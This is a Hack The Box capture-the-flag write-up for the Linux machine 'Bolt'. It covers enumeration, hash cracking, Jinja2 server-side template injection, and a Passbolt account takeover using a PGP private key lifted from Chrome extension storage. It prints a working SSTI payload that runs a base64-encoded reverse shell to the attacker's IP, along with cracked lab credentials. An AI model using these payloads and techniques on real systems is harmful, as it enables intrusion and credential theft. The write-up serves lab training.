# Bolt

| | |
|---|---|
| **OS** | Linux |
| **Difficulty** | Medium |
| **Topics** | AdminLTE, Roundcube Webmail 1.4.6, Password Cracking, SSTI, Server Side Template Injection, PGP Private Key, Passbolt - |

---

## 📁 Folder Structure

- [`content/`](content/) — screenshots and inline references used in the write-up
- [`nmap/`](nmap/) — raw nmap output files
- [`exploit/`](exploit/) — exploit scripts, binaries, payloads, and other tools used

---

# Enumeration

## Nmap

SYN Stealth Scan

```bash
sudo nmap -p- -sS --open --min-rate 5000 -Pn -n -v 10.10.11.114 -oN AllPorts
```

Result:

```markdown
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

TCP Full Scan: 

```bash
nmap -p22,80,443 -sCV -Pn -n -v 10.10.11.114 -oN FullScan
```

Result: 

```markdown
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA)
|   256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA)
|_  256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 76362BB7970721417C5F484705E5045D
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
|_http-title:     Starter Website -  About 
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
| http-title: Passbolt | Open source password manager for teams
|_Requested resource was /auth/login?redirect=%2F
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Issuer: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-02-24T19:11:23
| Not valid after:  2022-02-24T19:11:23
| MD5:   3ac3:4f7c:ee22:88de:7967:fe85:8c42:afc6
|_SHA-1: c606:ca92:404f:2f04:6231:68be:c4c4:644f:e9ed:f132
|_http-favicon: Unknown favicon MD5: 82C6406C68D91356C9A729ED456EECF4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From the ssl-cert script scan we can see a domain and a subdomain for the server.

```bash
Domain: bolt.htb
Subdomain: passbolt.bolt.htb
```

Enumerating additional subdomains: 

Wfuzz:

```bash
wfuzz -c --hc=400,403,404 --hw=1801 -t 20 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u 'http://bolt.htb' -H "Host: FUZZ.bolt.htb"
```

Result: 

![Untitled](content/Untitled.png)

In total, we have the following subdomains:

```bash
passbolt.bolt.htb
mail.bolt.htb
demo.bolt.htb
```

### Web Inspection

Domain: `bolt.htb` redirects to `passbolt.bolt.htb` 

![Untitled](content/Untitled%201.png)

Contains a Login Portal. 

Domain (HTTPS): `https://passbolt.bolt.htb`

![Untitled](content/Untitled%202.png)

Domain: `mail.bolt.htb`

![Untitled](content/Untitled%203.png)

Contains a Login Portal

Domain: `demo.bolt.htb`

![Untitled](content/Untitled%204.png)

Again, another Login Portal

** None of the Login Portals were found to be vulnerable to SQLi. 

After enumerating a bit more the main website `passbolt.bolt.htb` we found a section with the option to download a docker image: 

URL: `http://passbolt.bolt.htb/download`

![Untitled](content/Untitled%205.png)

![Untitled](content/Untitled%206.png)

To enumerate the contents of the docker image we can use a tool known as `dive`

Installation:

1- Download the package

```bash
wget https://github.com/wagoodman/dive/releases/download/v0.11.0/dive_0.11.0_linux_amd64.deb
```

2- Install it: 

```bash
sudo dpkg -i dive_0.11.0_linux_amd64.deb
```

Once installed, we can execute the following command to inspect the docker image:

```bash
dive docker-archive://image.tar
```

Output: 

We need to use the arrow keys to check each layer. 

![Untitled](content/Untitled%207.png)

After validating the layers, we found one that had some modifications such as deletion or modification of files.

![Untitled](content/Untitled%208.png)

If we hit `ctrl+u` we will the files that were modified:

![Untitled](content/Untitled%209.png)

From the output we can see that a DB file was deleted.

Based on this information, we need to check the previous layer to see if the file still exists:

![Untitled](content/Untitled%2010.png)

Success! We can see that file is part of that layer. 

Next step is copy the layer id which is in the layer details: 

![Untitled](content/Untitled%2011.png)

In this case the id is: 

```bash
a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2
```

Now, let’s decompress the `image.tar` but this time we pass the specific part we want to extract:

```bash
tar -xvf image.tar <layer-id>
```

Should look like this: 

![Untitled](content/Untitled%2012.png)

After checking the contents, we will see another tar file containing the files we want: 

![Untitled](content/Untitled%2013.png)

Let’s decompress again the file `layer.tar`

![Untitled](content/Untitled%2014.png)

Finally, we will see the SQLite file. 

![Untitled](content/Untitled%2015.png)

To enumerate the contents of the file we can use `sqlite3` and pass the file as argument:

```bash
sqlite3 db.sqlite3
```

Enumerate the tables: 

![Untitled](content/Untitled%2016.png)

After checking the content of the table `User` we will see a hash password for the username `admin`

In summary, we have the following credentials:

```bash
admin:$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.
```

We can try to bruteforce this hash using hashcat, however, we need to identify the hash type, for this we can use `hashid`:

![Untitled](content/Untitled%2017.png)

According to `hashid`, the hash is a MD5Crypt type, which according to the hashcat documentation, it corresponds to the hash-mode `500:`

![Untitled](content/Untitled%2018.png)

Reference: https://hashcat.net/wiki/doku.php?id=example_hashes

Hash Command: 

```bash
hashcat -m 500 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Result: 

```bash
$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.:deadbolt
```

Success! We got the password for the admin user.

```bash
admin:deadbolt
```

Now that we have potential valid credentials, let’s use them on the different login portals that we discovered before:

Portal: `http://bolt.htb/login`

![Untitled](content/Untitled%2019.png)

Using the credentials we discovered, we were able to log on the admin portal for `AdminLTE.3`

Then. after inspecting the contents of the portal, we will see an internal chat between `Alexander` and `Sarah`, discussing something about the access for the docker image 

![Untitled](content/Untitled%2020.png)

![Untitled](content/Untitled%2021.png)

We will keep in mind this information, as it seems to be relevant for the next steps. 

# Initial Access

After enumerating the website `bolt.htb` we did not find any other relevant information that could potentially help us to gain access. 

However, if we remember from the private chat we found in the admin session, the user `Sarah Bullok` was talking about a demo that is restricted only to users with invitation. 

As we enumerated earlier, we found a subdomain identified as `demo.bolt.htb` which seems to be the one that Sarah is referring to. 

Let’s check the website in deep: 

![Untitled](content/Untitled%2022.png)

Initially, the portal is asking to log with credentials, however, after trying with the credentials we found earlier (`admin`/`deadbolt`) we got no success.

However, there is another option available to create an account: 

![Untitled](content/Untitled%2023.png)

But apparently we are required to provide an invitation code. 

Based on this information, we can try to enumerate again the `docker` image in order to find relevant code that references the invitation code. 

First, we can inspect the source code of the webpage, we will that the field for the invitation code is referenced as `invitation_code`

![Untitled](content/Untitled%2024.png)

This time we will decompress all the contents of the docker image:

![Untitled](content/Untitled%2025.png)

Once we have all the contents, let’s apply a recursive grep with the field name `invitation_code` as search match:

```bash
grep -r -i "invite_code" *
```

Apparently, we can see that 2 of the layers contain the matching criteria:

![Untitled](content/Untitled%2026.png)

To be able to see the text and the matching criteria we need to pass: `--text` to the grep command:

![Untitled](content/Untitled%2027.png)

Now we can see in more detailed view which are the matches. 

From the output we can see that one of the matches seems to be `code   = request.form['invite_code']`, which could be the file that contains the code of the invitation code. 

This file seems to be part of the directory `41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer.tar` , hence, we need to move to the directory that contains that layer. 

```bash
cd 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad
```

Decompress the files contained in the tar file: 

![Untitled](content/Untitled%2028.png)

Execute again another grep to determine which file contains the code: 

![Untitled](content/Untitled%2029.png)

Based on this, the file `app/base/routes.py` seems to be the one that contains the code, hence, let’s inspect it.

After checking the code we will find the function `def register()` which is the one that takes place when we create an account. Inside the function, we found a hardcoded code, which seems to be the invitation code:  

![Untitled](content/Untitled%2030.png)

We can see the invitation code as `XNSS-HSJW-3NGU-8XTJ`

Let’s try to use the code to create an account: 

![Untitled](content/Untitled%2031.png)

After creating the account, we were redirected to the main portal to log on, and after providing the credentials we previously defined, we will be able to log on: 

![Untitled](content/Untitled%2032.png)

We can also try to access the other subdomain `mail.bolt.htb` with the account we just created. 

`http://mail.bolt.htb`

![Untitled](content/Untitled%2033.png)

Success! We got access to the mail domain.

![Untitled](content/Untitled%2034.png)

Back to the `demo.bolt.htb` domain, we will have the option to update some properties of our profile in the settings section.  We can use this vector to either exploit using a `XSS` or `SSTI` 

Let’s first start by testing which field is reflected after the update: 

![Untitled](content/Untitled%2035.png)

After updating the name we will receive an email in the `mail.bolt.htb` to confirm the changes. 

![Untitled](content/Untitled%2036.png)

We need to click on the link provided in order to confirm the changes. After that, we will receive another email with the confirmation. 

![Untitled](content/Untitled%2037.png)

Inside the email, we will see the field that was updated, in this case, the `Name` field is reflecting our name `new name`

This indicates that server processes our request by reading our input and then confirming the same by an email. We can use this to exploit a `SSTI (Server Side Template Injection).` 

Let’s try with a basic SSTI injection: 

```bash
{{7*7}}
```

If the server replies with a `49` in the email, then, it means that it is vulnerable to `SSTI.`

Inject the code: 

![Untitled](content/Untitled%2038.png)

After confirming the changes we received the email containing the `49`

![Untitled](content/Untitled%2039.png)

This confirms that server is vulnerable to `SSTI` Attacks. 

Based on this confirmation, we can try execute commands in order to gain remote access. 

For this, we can go to https://github.com/swisskyrepo/PayloadsAllTheThings and look for SSTI Payloads

![Untitled](content/Untitled%2040.png)

Checking the Methodology flow chart, we can see that one of the paths involve testing the expression `{{7*7}}` which we already did. 

![Untitled](content/Untitled%2041.png)

Next step is to test the expression `{{7*'7'}}` to confirm if the template language is vulnerable to `SSTI`. 

This time the expected result should be `7777777` as we are printing the string `7` seven times, not multiplying. 

![Untitled](content/Untitled%2042.png)

After changing the name and confirming the change we will see the email response with the confirmation of the vulnerability. 

![Untitled](content/Untitled%2043.png)

According to the flow chart, we can either use Jinja2 or Twig, however, we will go directly with Jinja2 as the web page title indicates that server is using Jinja.

![Untitled](content/Untitled%2044.png)

Checking the payloads from `PayloadAllTheThings` we will see several payloads we can test: 

![Untitled](content/Untitled%2045.png)

Let’s use the second payload: 

```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

![Untitled](content/Untitled%2046.png)

After saving the name and confirming the change we will the response email containing the result of the command `id`

![Untitled](content/Untitled%2047.png)

This confirms the Remote Code Execution vulnerability. 

Now, let’s replace the command with a reverse shell bash in base64 generated from https://www.revshells.com/

Payload:

```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTcvNDQ0NCAwPiYx | base64 -d | bash').read() }}
```

After saving the name and confirming the change, we will get access to the victim machine. 

![Untitled](content/Untitled%2048.png)

# Lateral Movement

After enumerating the files in the server, we will see that we can access one interesting folder identified as `/etc/passbolt`

![Untitled](content/Untitled%2049.png)

Contents of `/etc/passbolt`

![Untitled](content/Untitled%2050.png)

Checking the file contents of `passbolt.php` we will see some clear-text credentials: 

![Untitled](content/Untitled%2051.png)

Credentials:

```bash

username: passbolt
password: rT2;jW7<eY8!dX8}pQ8%
```

After login into the mysql and enumerating the database `passboltdb` we did not spot any hash or clean-text credential:

![Untitled](content/Untitled%2052.png)

Hence, next step will be to test the password for the mysql database with the local users created in the system. 

![Untitled](content/Untitled%2053.png)

We can see the users `eddie` and `clark`

Doing a simple `su eddie` and providing the password `rT2;jW7<eY8!dX8}pQ8%` we will get access granted.

![Untitled](content/Untitled%2054.png)

# Privilege Escalation

After enumerating the file system,  we will find an interesting file associated with a mail on path `/var/mail/eddie`

![Untitled](content/Untitled%2055.png)

The email is talking about a password management server, a browser extension, and a recovery key. 

Based on this information, we may need to access the password management server, which seems to be the one we found from the initial enumeration identified as `https://passbolt.bolt.htb`

![Untitled](content/Untitled%2056.png)

If we provide the email for `eddie` which commonly is the `username`+`domain`, and hit next, we will see that it is a valid email address, and that we are require to check our mailbox.

![Untitled](content/Untitled%2057.png)

However, we don't have access to mailbox at this point, but something we can do is to try to look into the database to find the reset token and then form the correct URL to reset the password. 

Checking passbolt forums we find the URL format here:

[Recover account on a network without email](https://community.passbolt.com/t/recover-account-on-a-network-without-email/1394)

Answer: 

![Untitled](content/Untitled%2058.png)

So, the format to recover the password will be: 

```bash
https://<your_domain>/setup/recover/<user_id>/<authentication_token.token>
```

To extract the authentication token and username we can use the following SQL Query: 

```bash
select token from authentication_tokens where user_id = (select id from users where username = 'your@email.com') and type = 'recover' order by created DESC;
```

If we remember, we had [access to the mysql database](Bolt%20860ce9f59a034da79b410387089cc7e0.md) for passbolt, hence, we can try to log on again and execute that query. 

![Untitled](content/Untitled%2059.png)

Token: 

![Untitled](content/Untitled%2060.png)

```bash
f3ad1847-9235-42e3-a99f-39c51054ce66
```

User ID: 

![Untitled](content/Untitled%2061.png)

```bash
4e184ee6-e436-47fb-91c9-dccb57f250bc
```

URL with the user id and token:

```bash
https:/passbolt.bolt.htb/setup/recover/4e184ee6-e436-47fb-91c9-dccb57f250bc/f3ad1847-9235-42e3-a99f-39c51054ce66
```

Now that we have built our URL, let’s try to access it.

We will be asked to install an extension, which seems to be the one that was mentioned in the email:

![Untitled](content/Untitled%2062.png)

After installing the extension, we will be asked to provide a OpenPGP private key and a file, which is the one that was also mentioned in the email. 

![Untitled](content/Untitled%2063.png)

Considering that user `eddie` also had to install the same extension in the browser on the target machine, this means that we can try to enumerate for potentiall config or log files that could contain the private key. 

Let’s go back to the shell session and look for any PGP key. To make this easier, if we take a look at some examples on internet, for instance from here https://www.ietf.org/archive/id/draft-bre-openpgp-samples-01.html we will see that PGP keys have a specific format defined as: 

```bash
-----BEGIN PGP PRIVATE KEY BLOCK-----
...
...
content
...
...
-----END PGP PRIVATE KEY BLOCK-----
```

We can use these string to make a better search using grep: 

```bash
grep -RE "BEGIN PGP PRIVATE KEY BLOCK|END PGP PRIVATE KEY BLOCK" /home/eddie/.* 2>/dev/null
```

After executing the search we will see some matches that point to Google Chrome Extensions:

![Untitled](content/Untitled%2064.png)

Then, by checking the content of each one we will find the Key in a binary file identified as `000003.log`:

Full Path: 

```bash
Binary file /home/eddie/./.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log 
```

To be able to see the contents of the file we need to use the command `grep` again but this time passing the argument `--text` so it returns the actual strings of the matches:

```bash
grep -E "BEGIN PGP PRIVATE KEY BLOCK|END PGP PRIVATE KEY BLOCK" 000003.log --text
```

From the output we will see more than PGP Private Key, however, we need to find the one that belongs to `eddie`

![Untitled](content/Untitled%2065.png)

Key: 

```bash
-----BEGIN PGP PRIVATE KEY BLOCK-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

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
PSwYYWlAywj5
=cqxZ
-----END PGP PRIVATE KEY BLOCK-----
```

Let’s save this PGP Private key in a file. 

Next step will be to try to crack the PGP Key using john the ripper, to do that, we need to first convert the key to a JTR friendly format:

We can use `gpg2john` to convert the key: 

```bash
gpg2john private-key.priv > hash-PGP.txt
```

![Untitled](content/Untitled%2066.png)

Crack the Key using John:

```bash
john hash-PGP-Eddie.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

After couple minutes we will have the password cracked: 

![Untitled](content/Untitled%2067.png)

PGP Key - Pasword Cracked: 

```bash
merrychristmas   (Eddie Johnson)
```

Finally, we can go back to the website for the password recovery and provide first the file containing the PGP Private Key:

![Untitled](content/Untitled%2068.png)

And after clicking next, we will need to provide the Passphrase, which is the one we just cracked: 

![Untitled](content/Untitled%2069.png)

Finally, we just need to select a random color and Security Toke (this is just protection against phishing attacks):

![Untitled](content/Untitled%2070.png)

Once we have completed the process, the server will take us to the password vault of Eddie where will find the password for root. 

![Untitled](content/Untitled%2071.png)

Credentials:

```bash
root:Z(2rmxsNW(Z?3=p/9s
```

Now, we just need to do a simple `su root` and provide the password we found: 

![Untitled](content/Untitled%2072.png)

[Owned Bolt from Hack The Box!](https://www.hackthebox.com/achievement/machine/906667/384)